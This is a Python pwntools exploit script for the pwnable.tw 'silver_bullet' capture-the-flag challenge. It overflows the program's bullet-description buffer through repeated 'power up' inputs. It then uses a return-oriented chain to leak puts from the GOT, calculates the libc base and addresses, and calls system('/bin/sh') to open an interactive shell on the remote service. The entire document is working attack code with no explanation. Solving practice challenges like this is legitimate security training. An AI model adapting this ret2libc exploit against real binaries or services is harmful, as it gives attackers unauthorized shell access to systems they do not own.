from pwn import *

elf = ELF('./silver_bullet')
libc = ELF('./libc_32.so.6')
p = remote('chall.pwnable.tw',10103)

# create bullet
p.recvuntil('Your choice :')
p.sendline('1')
p.recvuntil('Give me your description of bullet :')
p.sendline('a'*0x2f)
# power up
p.recvuntil('Your choice :')
p.sendline('2')
p.recvuntil('Give me your another description of bullet :')
p.sendline('b')

payload = "\xff"*3+p32(0xdeadbeef)
payload += p32(elf.plt['puts']) + p32(elf.symbols['main']) + p32(elf.got['puts'])
payload = payload.ljust(0x2f, 'a')
# power up
p.recvuntil('Your choice :')
p.sendline('2')
p.recvuntil('Give me your another description of bullet :')
p.sendline(payload)
# beat
p.recvuntil('Your choice :')
p.sendline('3')

p.recvuntil('win !!\n')
# put.plt
puts_addr = u32(p.recv(4))
print hex(puts_addr)
# libc base
libcbase_addr = puts_addr - libc.symbols['puts']
print hex(libcbase_addr)
# system
system_addr = libc.symbols['system'] + libcbase_addr
print hex(system_addr)
# /bin/sh 
binsh_addr = next(libc.search('/bin/sh')) + libcbase_addr

# create bullet
p.recvuntil('Your choice :')
p.sendline('1')
p.recvuntil('Give me your description of bullet :')
p.sendline('a'*0x2f)
# power up
p.recvuntil('Your choice :')
p.sendline('2')
p.recvuntil('Give me your another description of bullet :')
p.sendline('b')

payload1 = "\xff"*3 + p32(0xdeafbeef)
payload1 += p32(system_addr) + p32(elf.symbols['main']) + p32(binsh_addr)
payload1 = payload1.ljust(0x2f, 'a')
# power up
p.recvuntil('Your choice :')
p.sendline('2')
p.recvuntil('Give me your another description of bullet :')
p.sendline(payload1)
# beat
p.recvuntil('Your choice :')
p.sendline('3')
p.interactive()
